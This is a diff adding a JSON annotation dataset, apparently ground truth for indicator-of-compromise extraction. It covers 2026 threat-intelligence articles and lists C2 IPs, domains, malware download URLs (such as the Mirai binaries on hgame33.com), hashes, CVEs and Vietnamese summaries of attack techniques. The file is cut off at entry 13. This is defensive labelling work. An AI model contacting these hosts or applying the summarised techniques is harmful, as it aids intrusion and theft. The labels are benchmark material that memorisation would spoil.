@@ -1,0 +1,2025 @@
+[
+  {
+    "index": 1,
+    "article_id": "thn-aa6560399965",
+    "title": "GoBruteforcer Botnet Targets Crypto Project Databases by Exploiting Weak Credentials",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-01-12",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [
+        "45.88.186.70",
+        "204.76.203.125"
+      ],
+      "domains": [],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [],
+      "attack_behaviors": [
+        "Tấn công dò mật khẩu (brute-force) nhắm vào các dịch vụ FTP, MySQL, PostgreSQL và phpMyAdmin trên máy chủ Linux bằng danh sách tài khoản mặc định phổ biến trong code mẫu do AI/LLM sinh ra (ví dụ: myuser:Abcd@123, appeaser:admin123456, cryptouser, wpuser).",
+        "Lợi dụng dịch vụ FTP mở công khai trên các máy chủ cài đặt XAMPP để tải lên PHP web shell.",
+        "Thực thi shell script tương ứng với kiến trúc hệ thống (x86, x64, ARM) để tải và chạy IRC bot viết bằng ngôn ngữ Golang (GoBruteforcer).",
+        "Máy chủ bị nhiễm hoạt động đa chức năng: tiếp tục brute-force diện rộng, lưu trữ và phát tán payload cho nạn nhân khác, hoặc đóng vai trò máy chủ điều khiển (C2) dự phòng qua giao thức IRC.",
+        "Triển khai module quét danh sách địa chỉ ví blockchain TRON và truy vấn số dư thông qua API của tronscanapi.com để tìm kiếm các tài khoản có số dư khác 0.",
+        "Thực hiện trinh sát quy mô lớn (80.469 phiên trong 11 ngày từ 2 IP 45.88.186.70 và 204.76.203.125) quét hơn 73 endpoint mô hình LLM để tìm kiếm máy chủ proxy cấu hình sai làm rò rỉ quyền truy cập các API thương mại (OpenAI, Anthropic, DeepSeek, Google, Meta, Mistral, Alibaba, xAI)."
+      ]
+    },
+    "annotator_notes": "Tên miền tronscanapi.com là dịch vụ API hợp pháp của mạng lưới TRON bị mã độc lợi dụng để kiểm tra số dư ví nạn nhân, KHÔNG phải tên miền C2 độc hại nên đã loại khỏi danh sách Domains C2. Hai địa chỉ IP 45.88.186.70 và 204.76.203.125 được ghi nhận trong phần tin liên quan (GreyNoise) về chiến dịch quét tìm proxy LLM cấu hình sai bắt đầu từ ngày 28/12/2025."
+  },
+  {
+    "index": 2,
+    "article_id": "thn-40afd2505d67",
+    "title": "Researchers Null-Route Over 550 Kimwolf and Aisuru Botnet Command Servers",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-01-14",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [
+        "65.108.5.46",
+        "194.46.59.169",
+        "104.171.170.21",
+        "104.171.170.201",
+        "176.65.149.19"
+      ],
+      "domains": [
+        "proxy-sdk.14emeliaterracewestroxburyma02132.su",
+        "14emeliaterracewestroxburyma02132.su",
+        "greatfirewallisacensorshiptool.14emeliaterracewestroxburyma02132.su"
+      ],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [],
+      "attack_behaviors": [
+        "Khai thác lỗ hổng các dịch vụ residential proxy (PYPROXY, IPIDEA, Plainproxies) để chui vào mạng nội bộ và phát tán mã độc (nhúng ByteConnect SDK).",
+        "Lợi dụng các thiết bị Android TV / TV box mở cổng dịch vụ Android Debug Bridge (ADB) để lây nhiễm.",
+        "Thiết lập kết nối SSH từ các IP dân cư (residential SSH connections) đến máy chủ C2 (194.46.59.169).",
+        "Giao tiếp tải payload/mã độc qua cổng 25565 (176.65.149.19:25565).",
+        "Chiếm quyền điều khiển router SOHO (KeeneticOS) hàng loạt với cấu hình và SSH fingerprints đồng nhất, mở duy trì truy cập qua HTTP (port 80) và SSH (port 22) để làm nút proxy trung gian.",
+        "Quét mạng cục bộ (local network scan) từ các node đã bị nhiễm để tìm kiếm các thiết bị mở ADB khác nhằm lây lan ngang hàng."
+      ]
+    },
+    "annotator_notes": "Bài báo đề cập đến 2 chiến dịch botnet liên kết chặt chẽ với nhau là AISURU và biến thể Android của nó là Kimwolf. Tên miền resi.to là Discord server nơi các đối tượng giao dịch dịch vụ proxy, không phải tên miền C2 kỹ thuật."
+  },
+  {
+    "index": 3,
+    "article_id": "thn-88fd4729371c",
+    "title": "CrashFix Chrome Extension Delivers ModeloRAT Using ClickFix-Style Browser Crash Lures",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-01-19",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [
+        "199.217.98.108",
+        "170.168.103.208",
+        "158.247.252.178",
+        "144.31.221.197"
+      ],
+      "domains": [
+        "nexsnield.com"
+      ],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [],
+      "attack_behaviors": [
+        "Giả mạo tiện ích chặn quảng cáo uBlock Origin Lite trên Chrome Web Store dưới tên \"NexShield – Advanced Web Guardian\" (Extension ID: cpcdkmjddocikjdkbbeiaafnpdbdafmi) để lừa người dùng cài đặt.",
+        "Kích hoạt vòng lặp vô hạn (1 tỷ lần lặp) tạo kết nối runtime port gây cạn kiệt tài nguyên RAM (DoS cục bộ), làm treo và sập trình duyệt Chrome/Edge nhằm ép người dùng khởi động lại trình duyệt.",
+        "Hiển thị cảnh báo bảo mật giả mạo (kỹ thuật CrashFix / ClickFix) sau 60 phút cài đặt (và lặp lại mỗi 10 phút), tự động sao chép lệnh độc hại vào clipboard và hướng dẫn nạn nhân mở hộp thoại Windows Run (Win+R) để dán và thực thi.",
+        "Lạm dụng tiện ích hợp pháp của Windows là `finger.exe` để kết nối tới máy chủ C2 (199.217.98.108) tải và thực thi lệnh PowerShell giai đoạn tiếp theo.",
+        "Sử dụng PowerShell mã hóa nhiều lớp (Base64 + XOR), kiểm tra hơn 50 tiến trình công cụ phân tích/máy ảo (anti-VM/anti-analysis) và gửi HTTP POST chứa danh sách phần mềm diệt virus cùng cờ định danh môi trường (`ABCD111` cho máy WORKGROUP độc lập, `BCDA222` cho máy đã join Domain).",
+        "Triển khai mã độc ModeloRAT (viết bằng Python, mã hóa giao tiếp C2 bằng RC4 tới 170.168.103.208 hoặc 158.247.252.178) trên các máy tính thuộc môi trường doanh nghiệp (domain-joined).",
+        "Thực hiện trinh sát hệ thống bằng các lệnh Windows gốc như `nltest`, `whoami`, `net use`.",
+        "Duy trì sự tồn tại (persistence) bằng cách thêm khóa vào Registry Run và tạo Scheduled Task giả mạo tên `SoftwareProtection` (chạy payload Python mỗi 5 phút sau khi tải tệp ZIP từ 144.31.221.197)."
+      ]
+    },
+    "annotator_notes": "Chiến dịch này thuộc hệ thống phân phối lưu lượng độc hại (TDS) KongTuke (còn gọi là 404 TDS, Chaya_002, LandUpdate808, TAG-124), thường liên kết với các nhóm ransomware như Rhysida và Interlock. Đã refang toàn bộ IP và tên miền (nexsnield.com)."
+  },
+  {
+    "index": 4,
+    "article_id": "thn-71c64490b0d7",
+    "title": "Malicious VS Code AI Extensions with 1.5 Million Installs Steal Developer Source Code",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-01-26",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [],
+      "domains": [
+        "aihao123.cn"
+      ],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [
+        "CVE-2025-69264",
+        "CVE-2025-69263"
+      ],
+      "attack_behaviors": [
+        "Phát tán 2 tiện ích mở rộng (extensions) giả mạo trợ lý lập trình AI trên Visual Studio Marketplace với hơn 1,5 triệu lượt cài đặt: `ChatGPT - 中文版` (ID: `whensunset.chatgpt-china`) và `ChatGPT - ChatMoss（CodeMoss）` (ID: `zhukunpeng.chat-moss`).",
+        "Tự động đọc toàn bộ nội dung của mọi tệp mã nguồn đang mở hoặc vừa được chỉnh sửa, mã hóa sang định dạng Base64 và gửi lén về máy chủ đặt tại Trung Quốc (`aihao123.cn`).",
+        "Tích hợp cơ chế giám sát thời gian thực cho phép máy chủ C2 kích hoạt từ xa việc đánh cắp hàng loạt tối đa 50 tệp tin trong thư mục làm việc (workspace) của lập trình viên.",
+        "Nhúng thẻ `<iframe>` ẩn kích thước 0-pixel trong giao diện webview của extension để tải 4 bộ SDK phân tích dữ liệu thương mại (Zhuge.io, GrowingIO, TalkingData, Baidu Analytics) nhằm thu thập dấu vân tay thiết bị (device fingerprinting) và lập hồ sơ người dùng.",
+        "(Phần tin liên quan PackageGate): Khai thác lỗ hổng vượt qua cơ chế chặn thực thi lifecycle scripts (`--ignore-scripts`) và kiểm tra tính toàn vẹn lockfile trong các trình quản lý gói JavaScript (npm, pnpm, vlt, Bun)."
+      ]
+    },
+    "annotator_notes": "Chiến dịch đánh cắp mã nguồn qua VS Code được Koi Security đặt tên là MaliciousCorgi. Các tên miền Zhuge.io, GrowingIO, TalkingData, Baidu Analytics là các nền tảng phân tích dữ liệu thương mại hợp pháp của Trung Quốc bị nhúng vào iframe để theo dõi nạn nhân, không phải hạ tầng C2 chuyên biệt nên không đưa vào trường Domains C2. Hai mã lỗ hổng CVE-2025-69264 và CVE-2025-69263 thuộc phần tin tức mở rộng trong cùng bài báo về nhóm lỗ hổng PackageGate ảnh hưởng đến trình quản lý gói pnpm."
+  },
+  {
+    "index": 5,
+    "article_id": "securelist-9024165e",
+    "title": "HoneyMyte updates CoolClient and deploys multiple stealers in recent campaigns",
+    "source_name": "Kaspersky Securelist",
+    "published_date": "2026-01-27",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [
+        "45.144.165.65",
+        "113.23.212.15"
+      ],
+      "domains": [
+        "account.hamsterxnxx.com",
+        "popnike-share.com",
+        "japan.Lenovoappstore.com"
+      ],
+      "urls": [
+        "http://45.144.165.65/BUIEFuiHFUEIuioKLWENFUoi878UIESf/MUEWGHui897hjkhsjdkHfjegfdh/67jksaebyut8seuhfjgfdgdfhet4SEDGF/Tools/getlogindataedge.exe",
+        "http://113.23.212.15/pub/"
+      ],
+      "md5": [
+        "F518D8E5FE70D9090F6280C68A95998F",
+        "1A61564841BBBB8E7774CBBEB3C68D5D",
+        "AEB25C9A286EE4C25CA55B72A42EFA2C",
+        "6B7300A8B3F4AAC40EEECFD7BC47EE7C",
+        "7AA53BA3E3F8B0453FFCFBA06347AB34",
+        "A1CD59F769E9E5F6A040429847CA6EAE",
+        "1BC5329969E6BF8EF2E9E49AAB003F0B",
+        "1A5A9C013CE1B65ABC75D809A25D36A7",
+        "E1B7EF0F3AC0A0A64F86E220F362B149",
+        "DA6F89F15094FD3F74BA186954BE6B05",
+        "C19BD9E6F649DF1DF385DEEF94E0E8C4",
+        "838B591722512368F81298C313E37412",
+        "A4D7147F0B1CA737BFC133349841AABA"
+      ],
+      "sha256": [],
+      "cves": [],
+      "attack_behaviors": [
+        "Sử dụng kỹ thuật DLL sideloading lạm dụng các file nhị phân hợp pháp đã ký số của phần mềm Sangfor (như Sang.exe) để tải DLL độc hại libngs.dll.",
+        "Thực thi chuỗi nhiều giai đoạn (multi-stage) gồm giải mã và tiêm mã độc vào tiến trình write.exe.",
+        "Thiết lập cơ chế tự động chạy (AutoRun persistence) bằng cách thêm khóa vào Registry (`HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`).",
+        "Cài đặt và khởi chạy Windows Service tên `media_updaten`.",
+        "Kiểm tra các tiến trình diệt virus (360sd.exe, zhudongfangyu.exe, 360desktopservice64.exe).",
+        "Bỏ qua cơ chế UAC (UAC bypass) và leo thang đặc quyền bằng cách mạo danh tiến trình svchost.exe và tạo Scheduled Task (`ComboxResetTask`).",
+        "Giám sát clipboard và cửa sổ hoạt động (Active windows monitor) qua `GetClipboardData` và `GetWindowTextW`, mã hóa dữ liệu XOR (khóa `0xAC`) ghi vào `C:\\ProgramData\\AppxProvisioning.xml`.",
+        "Bắt gói tin mạng (Packet sniffer) trích xuất thông tin xác thực proxy HTTP từ tiêu đề `Proxy-Authorization: Basic`.",
+        "Đánh cắp thông tin đăng nhập trình duyệt bằng cách sao chép file `Login Data` sang file tạm (`chromeTmp`) và thực thi truy vấn SQLite, giải mã master key từ file `Local State`.",
+        "Sử dụng các tập lệnh batch (`1.bat`) và PowerShell (`Ttraazcs32.ps1`, `t.ps1`) để thu thập thông tin hệ thống, đóng tiến trình trình duyệt, nén dữ liệu duyệt web/FileZilla thành tệp RAR có mật khẩu và tải lên máy chủ qua FTP."
+      ]
+    },
+    "annotator_notes": "Nhóm APT HoneyMyte (Mustang Panda / Bronze President) dùng DLL sideloading qua tệp hợp pháp của Sangfor/BitDefender/VLC/Ulead để chạy backdoor CoolClient cùng 3 biến thể browser login stealer và các script 1.bat, Ttraazcs32.ps1, t.ps1. Đã loại URL Google Drive API hợp pháp (https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart) bị script lạm dụng để exfil."
+  },
+  {
+    "index": 6,
+    "article_id": "thn-f35a3fc043b7",
+    "title": "Researchers Find 175,000 Publicly Exposed Ollama AI Servers Across 130 Countries",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-01-29",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [],
+      "domains": [
+        "silver.inc"
+      ],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [],
+      "attack_behaviors": [
+        "Quét và phát hiện hơn 175.000 máy chủ Ollama AI bị lộ diện trực tuyến trên Internet (publicly exposed) tại 130 quốc gia do cấu hình mặc định (gắn trực tiếp trên interface 0.0.0.0 thay vì localhost 127.0.0.1).",
+        "Nguy cơ bị kẻ tấn công lợi dụng để truy cập trái phép vào các mô hình ngôn ngữ lớn (LLM), đánh cắp dữ liệu, trích xuất prompt, hoặc chiếm đoạt tài nguyên máy chủ để chạy tính toán nặng mà không cần xác thực."
+      ]
+    },
+    "annotator_notes": "Cảnh báo 175.000 máy chủ Ollama lộ diện (bind 0.0.0.0 thay vì 127.0.0.1); chiến dịch LLMjacking Operation Bizarre Bazaar bán lại quyền truy cập LLM trên chợ đen silver.inc. Đã loại 127.0.0.1 và 0.0.0.0."
+  },
+  {
+    "index": 7,
+    "article_id": "thn-cb58df5d37b7",
+    "title": "Researchers Uncover Chrome Extensions Abusing Affiliate Links and Stealing ChatGPT Access",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-01-30",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [],
+      "domains": [
+        "app.10xprofit.io",
+        "api.office123456.com"
+      ],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [
+        "CVE-2020-28707"
+      ],
+      "attack_behaviors": [
+        "Cụm 29 extension trên Chrome Web Store (nhà phát hành 10Xprofit, tiêu biểu Amazon Ads Blocker) ngầm chèn hoặc thay thế mã affiliate (10xprofit-20 cho Amazon, _c3pFXV63 cho AliExpress) trên URL thương mại điện tử.",
+        "Thu thập dữ liệu sản phẩm gửi về app.10xprofit.io và dựng đồng hồ đếm ngược giả (LIMITED TIME DEAL) để ép người dùng mua hàng.",
+        "Nhóm 4 extension của Symantec (>100.000 lượt cài): Good Tab cấp quyền đọc/ghi clipboard từ xa cho api.office123456.com; Children Protection thu thập cookie và chạy JS từ xa; DPS Websafe chiếm quyền tìm kiếm mặc định; Stock Informer chứa lỗ hổng XSS CVE-2020-28707.",
+        "Mạng lưới 16 extension ChatGPT Mods chèn content script vào chatgpt.com để đánh cắp token xác thực tài khoản OpenAI ChatGPT (~900 lượt tải).",
+        "Bộ công cụ MaaS Stanley (bán $2,000-$6,000) tạo extension Chrome hiển thị iframe giả mạo trang ngân hàng toàn màn hình trong khi giữ nguyên thanh địa chỉ URL thật."
+      ]
+    },
+    "annotator_notes": "Tên miền chatgpt.com là trang mục tiêu bị content script đánh cắp token (nạn nhân), KHÔNG phải domain C2 của kẻ tấn công nên đã loại khỏi danh sách Domains độc hại."
+  },
+  {
+    "index": 8,
+    "article_id": "thn-bb2f0be4112c",
+    "title": "Researchers Find 341 Malicious ClawHub Skills Stealing Data from OpenClaw Users",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-02-02",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [
+        "91.92.242.30"
+      ],
+      "domains": [],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [],
+      "attack_behaviors": [
+        "Phát hiện 341 kỹ năng (skills) độc hại trên kho lưu trữ ClawHub chuyên đánh cắp dữ liệu từ người dùng hệ thống OpenClaw.",
+        "Các extension/module mở rộng giả mạo tính năng tiện ích nhưng ngầm thu thập thông tin nhạy cảm, mã nguồn và dữ liệu cá nhân của người dùng để gửi về máy chủ kẻ tấn công."
+      ]
+    },
+    "annotator_notes": "Bổ sung IP C2 dùng chung 91.92.242.30 phát tán Atomic Stealer (ClawHavoc) qua các skill giả trên ClawHub. Đã loại nền tảng công cộng bị lạm dụng (glot.io, webhook.site) và tên tệp lưu trữ openclaw-agent.zip."
+  },
+  {
+    "index": 9,
+    "article_id": "thn-6313e0cdee3f",
+    "title": "Notepad++ Hosting Breach Attributed to China-Linked Lotus Blossom Hacking Group",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-02-03",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [
+        "95.179.213.0",
+        "45.76.155.202",
+        "45.32.144.255"
+      ],
+      "domains": [
+        "api.skycloudcenter.com",
+        "self-dns.it.com"
+      ],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [],
+      "attack_behaviors": [
+        "Nhóm APT Lotus Blossom (Billbug / Lotus Panda) xâm nhập nhà cung cấp hosting của Notepad++ (từ 06/2025 đến 02/12/2025) để chuyển hướng có chọn lọc lưu lượng cập nhật WinGUp (GUP.exe).",
+        "Phân phối trình cài đặt NSIS độc hại (update.exe, install.exe, AutoUpdater.exe) qua 3 chuỗi lây nhiễm thay đổi theo từng tháng từ các IP 45.76.155.202, 45.32.144.255 và 95.179.213.0.",
+        "Lạm dụng kỹ thuật DLL side-loading thông qua tệp hợp pháp đổi tên BluetoothService.exe (Bitdefender Submission Wizard) để giải mã shellcode qua log.dll và nạp backdoor Chrysalis.",
+        "Chrysalis kết nối C2 api.skycloudcenter.com qua HTTP để mở shell tương tác, thao tác tệp, tải/gửi dữ liệu; đồng thời file conf.c và ConsoleApplication2.exe lạm dụng framework Microsoft Warbird để nạp shellcode Metasploit/Cobalt Strike.",
+        "Các biến thể đầu gửi thông tin hệ thống (whoami, tasklist) lên dịch vụ chia sẻ tạm temp.sh và sau đó chuyển sang self-dns.it.com/list."
+      ]
+    },
+    "annotator_notes": "Dịch vụ temp.sh là nền tảng lưu trữ tệp công cộng bị kẻ tấn công lạm dụng tạm thời nên loại khỏi domain C2 riêng. Các đường dẫn payload không kèm scheme trong bài báo gồm /update/update.exe, /update/install.exe, /update/AutoUpdater.exe và self-dns.it.com/list."
+  },
+  {
+    "index": 10,
+    "article_id": "thn-db7ed05f2920",
+    "title": "APT28 Uses Microsoft Office CVE-2026-21509 in Espionage-Focused Malware Attacks",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-02-03",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [],
+      "domains": [],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [
+        "CVE-2026-21509"
+      ],
+      "attack_behaviors": [
+        "Nhóm APT (Advanced Persistent Threat) nổi tiếng APT28 lợi dụng lỗ hổng thực thi mã từ xa trong Microsoft Office mang mã CVE-2026-21509 trong các cuộc tấn công gián điệp mạng (espionage-focused malware attacks).",
+        "Sử dụng các tài liệu văn bản Microsoft Office được crafted tinh vi để khai thác lỗ hổng khi nạn nhân mở file, qua đó triển khai mã độc ngầm trên hệ thống mục tiêu."
+      ]
+    },
+    "annotator_notes": "Bài báo tập trung phân tích chiến dịch gián điệp của APT28 khai thác lỗ hổng zero-day/mới nổi CVE-2026-21509 của Microsoft Office."
+  },
+  {
+    "index": 11,
+    "article_id": "securelist-7e721564",
+    "title": "Stan Ghouls targeting Russia and Uzbekistan with NetSupport RAT",
+    "source_name": "Kaspersky Securelist",
+    "published_date": "2026-02-05",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [],
+      "domains": [
+        "mysoliq-uz.com",
+        "my-xb.com",
+        "xarid-uz.com",
+        "ach-uz.com",
+        "soliq-uz.com",
+        "minjust-kg.com",
+        "esf-kg.com",
+        "taxnotice-kg.com",
+        "notice-kg.com",
+        "proauditkg.com",
+        "kgauditcheck.com",
+        "servicedoc-kg.com",
+        "auditnotice-kg.com",
+        "tax-kg.com",
+        "rouming-uz.com",
+        "audit-kg.com",
+        "kyrgyzstanreview.com",
+        "salyk-notofocations.com",
+        "hgame33.com",
+        "ravinads.com"
+      ],
+      "urls": [
+        "https://mysoliq-uz.com/api/v2/documents/financial/Q4-2025/audited/consolidated/with-notes/financials/reports/annual/2025/tashkent/statistical-statements/",
+        "https://my-xb.com/api/v2/documents/financial/Q4-2025/audited/consolidated/with-notes/financials/reports/annual/2025/tashkent/statistical-statements/",
+        "http://www.hgame33.com/00101010101001/morte.spc",
+        "http://hgame33.com/00101010101001/debug",
+        "http://www.hgame33.com/00101010101001/morte.x86",
+        "http://www.hgame33.com/00101010101001/morte.mpsl",
+        "http://www.hgame33.com/00101010101001/morte.arm7",
+        "http://www.hgame33.com/00101010101001/morte.sh4",
+        "http://hgame33.com/00101010101001/morte.arm",
+        "http://hgame33.com/00101010101001/morte.i686",
+        "http://hgame33.com/00101010101001/morte.arc",
+        "http://hgame33.com/00101010101001/morte.arm5",
+        "http://hgame33.com/00101010101001/morte.arm6",
+        "http://www.hgame33.com/00101010101001/morte.m68k",
+        "http://www.hgame33.com/00101010101001/morte.ppc",
+        "http://www.hgame33.com/00101010101001/morte.x86_64",
+        "http://hgame33.com/00101010101001/morte.mips"
+      ],
+      "md5": [
+        "7556e2f5a8f7d7531f28508f718cb83d",
+        "95db93454ec1d581311c832122d21b20",
+        "cb9c28a4c6657ae5ea810020cb214ff0",
+        "106911ba54f7e5e609c702504e69c89a",
+        "B4FF4AA3EBA9409F9F1A5210C95DC5C3",
+        "AF9321DDB4BEF0C3CD1FF3C7C786F0E2",
+        "056B75FE0D230E6FF53AC508E0F93CCB",
+        "DB84FEBFD85F1469C28B4ED70AC6A638",
+        "649C7CACDD545E30D015EDB9FCAB3A0C",
+        "BE0C87A83267F1CE13B3F75C78EAC295",
+        "78CB3ABD00A1975BEBEDA852B2450873",
+        "51703911DC437D4E3910CE7F866C970E",
+        "FA53B0FCEF08F8FF3FFDDFEE7F1F4F1A",
+        "79D0EEAFB30AA2BD4C261A51104F6ACC",
+        "8DA8F0339D17E2466B3D73236D18B835",
+        "299A7E3D6118AD91A9B6D37F94AC685B",
+        "62AFACC37B71D564D75A58FC161900C3",
+        "047A600E3AFBF4286175BADD4D88F131",
+        "ED0CCADA1FE1E13EF78553A48260D932",
+        "C363CD87178FD660C25CDD8D978685F6",
+        "61FF22BA4C3DF7AE4A936FCFDEB020EA",
+        "B51D9EDC1DC8B6200F260589A4300009",
+        "923557554730247D37E782DB3BEA365D",
+        "60C34AD7E1F183A973FB8EE29DC454E8",
+        "0CC80A24841401529EC9C6A845609775",
+        "0CE06C962E07E63D780E5C2777A661FC",
+        "1b740b17e53c4daeed45148bfbee4f14",
+        "3f99fed688c51977b122789a094fec2e",
+        "8b0bbe7dc960f7185c330baa3d9b214c",
+        "646a680856f837254e6e361857458e17",
+        "8064f7ac9a5aa845ded6a1100a1d5752",
+        "d0cf8946acd3d12df1e8ae4bb34f1a6e",
+        "db796d87acb7d980264fdcf5e94757f0",
+        "e3cb4dafa1fb596e1e34e4b139be1b05",
+        "e0023eb058b0c82585a7340b6ed4cc06",
+        "0bf01810201004dcc484b3396607a483",
+        "4C4FA06BD840405FBEC34FE49D759E8D",
+        "A539A07891A339479C596BABE3060EA6",
+        "b13f7ccbedfb71b0211c14afe0815b36",
+        "f14275f8f420afd0f9a62f3992860d68",
+        "3f41091afd6256701dd70ac20c1c79fe",
+        "5c4a57e2e40049f8e8a6a74aa8085c80",
+        "7e8feb501885eff246d4cb43c468b411",
+        "8aa104e64b00b049264dc1b01412e6d9",
+        "8c63818261735ddff2fe98b3ae23bf7d"
+      ],
+      "sha256": [
+        "1acd4592a4eb0c66642cc7b07213e9c9584c6140210779fbc9ebb76a90738d5e",
+        "5d840b741d1061d51d9786f8009c37038c395c129bee608616740141f3b202bb"
+      ],
+      "cves": [],
+      "attack_behaviors": [
+        "Gửi email spear-phishing bằng tiếng Uzbek/Kyrgyz/Nga đính kèm PDF mồi nhử (trát tòa án, hồ sơ tài chính như E-SUD_705306256_ljro_varaqasi.pdf) chứa liên kết giả mạo cổng thuế/tư pháp để tải loader Java JAR.",
+        "Malicious Java loader hiển thị thông báo lỗi giả bằng tiếng Uzbek/Nga, giới hạn số lần chạy (< 3) qua thủ tục limitCheck, sau đó tải trọn bộ tệp NetSupport RAT (client32.exe, client32.ini, remcmdstub.exe, DLLs) từ hạ tầng C2.",
+        "Duy trì bền vững NetSupport RAT bằng 3 cơ chế: đặt SoliqUZ_Run.bat trong thư mục Startup, thêm khóa Registry HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run và tạo Scheduled Task chạy run.bat khi đăng nhập (ONLOGON).",
+        "File cấu hình client32.ini trỏ về GatewayAddress hgame33.com:443 và SecondaryGateway ravinads.com:443; ngoài ra hgame33.com còn lưu trữ 15 biến thể Mirai IoT đa kiến trúc (/00101010101001/morte.*)."
+      ]
+    },
+    "annotator_notes": "Ngoài 18 domain trong bảng IOC cuối bài, báo cáo còn nêu rõ hgame33.com và ravinads.com trong cấu hình client32.ini cùng 15 URL phát tán Mirai trên hgame33.com; có 45 MD5 (22 PDF decoy + 20 loader + 3 MD5 nêu trong thân bài) và 2 SHA256 đối chiếu từ chiến dịch trước."
+  },
+  {
+    "index": 12,
+    "article_id": "thn-bf975c96f290",
+    "title": "SolarWinds Web Help Desk Exploited for RCE in Multi-Stage Attacks on Exposed Servers",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-02-09",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [
+        "154.26.156.181",
+        "51.161.152.26"
+      ],
+      "domains": [
+        "v2-api.mooo.com",
+        "auth.qgtxtebl.workers.dev"
+      ],
+      "urls": [
+        "https://auth.qgtxtebl.workers.dev/"
+      ],
+      "md5": [],
+      "sha256": [],
+      "cves": [
+        "CVE-2025-40551",
+        "CVE-2025-40536",
+        "CVE-2025-26399",
+        "CVE-2025-6264"
+      ],
+      "attack_behaviors": [
+        "Khai thác lỗ hổng RCE/bypass trên các máy chủ SolarWinds Web Help Desk (WHD) lộ diện Internet (CVE-2025-40551, CVE-2025-40536 hoặc CVE-2025-26399) để chạy PowerShell/BITS tải payload.",
+        "Triển khai Zoho ManageEngine / Zoho Assist RMM đăng ký vào tài khoản Proton Mail esmahyft@proton.me để truy cập từ xa; sau đó lợi dụng phiên Zoho cài Velociraptor 0.73.4 chứa lỗ hổng leo quyền CVE-2025-6264.",
+        "Dựng cơ chế dự phòng C2 cho Velociraptor: kết nối https://auth.qgtxtebl.workers.dev/ và chuyển sang v2-api.mooo.com nếu kiểm tra thấy mã HTTP 406 Not Acceptable.",
+        "Tắt Windows Defender/Firewall qua Registry, tạo Scheduled Task chạy máy ảo QEMU mở backdoor SSH ẩn qua port-forwarding, dùng DLL side-loading wab.exe -> sspicli.dll để dump LSASS và chạy DCSync chiếm Active Directory.",
+        "Thu thập thông tin hệ thống đẩy thẳng lên Elastic Cloud SIEM dùng thử (đăng ký qua firstmail.ltd) và đăng nhập quản trị Kibana từ 2 IP 154.26.156.181 và 51.161.152.26 (exit node Safing Privacy Network)."
+      ]
+    },
+    "annotator_notes": "Đã loại dịch vụ email/nền tảng dùng chung proton.me và firstmail.ltd khỏi danh sách domain chặn cứng (tài khoản kẻ tấn công dùng esmahyft@proton.me), đồng thời giữ subdomain cụ thể auth.qgtxtebl.workers.dev và C2 dự phòng v2-api.mooo.com."
+  },
+  {
+    "index": 13,
+    "article_id": "securelist-bbd64eab",
+    "title": "The game is over: when “free” comes at too high a price. What we know about RenEngine",
+    "source_name": "Kaspersky Securelist",
+    "published_date": "2026-02-11",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [],
+      "domains": [
+        "hentakugames.com",
+        "dodi-repacks.site",
+        "artistapirata.fit",
+        "artistapirata.vip",
+        "awdescargas.pro",
+        "fullprogramlarindir.me",
+        "gamesleech.com",
+        "parapcc.com",
+        "saglamindir.vip",
+        "zdescargas.pro",
+        "filedownloads.store",
+        "go.zovo.ink",
+        "localfxement.live",
+        "explorebieology.run",
+        "agroecologyguide.digital",
+        "moderzysics.top",
+        "seedsxouts.shop",
+        "codxefusion.top",
+        "farfinable.top",
+        "techspherxe.top",
+        "cropcircleforum.today"
+      ],
+      "urls": [
+        "https://hentakugames.com/country-bumpkin/",
+        "https://dodi-repacks.site",
+        "https://artistapirata.fit",
+        "https://artistapirata.vip",
+        "https://awdescargas.pro",
+        "https://fullprogramlarindir.me",
+        "https://gamesleech.com",
+        "https://parapcc.com",
+        "https://saglamindir.vip",
+        "https://zdescargas.pro",
+        "https://filedownloads.store",
+        "https://go.zovo.ink",
+        "https://steamcommunity.com/profiles/76561199822375128",
+        "https://localfxement.live",
+        "https://explorebieology.run",
+        "https://agroecologyguide.digital",
+        "https://moderzysics.top",
+        "https://seedsxouts.shop",
+        "https://codxefusion.top",
+        "https://farfinable.top",
+        "https://techspherxe.top",
+        "https://cropcircleforum.today"
+      ],
+      "md5": [
+        "12EC3516889887E7BCF75D7345E3207A",
+        "D3CF36C37402D05F1B7AA2C444DC211A",
+        "1E0BF40895673FCD96A8EA3DDFAB0AE2",
+        "2E70ECA2191C79AD15DA2D4C25EB66B9"
+      ],
+      "sha256": [],
+      "cves": [],
+      "attack_behaviors": [
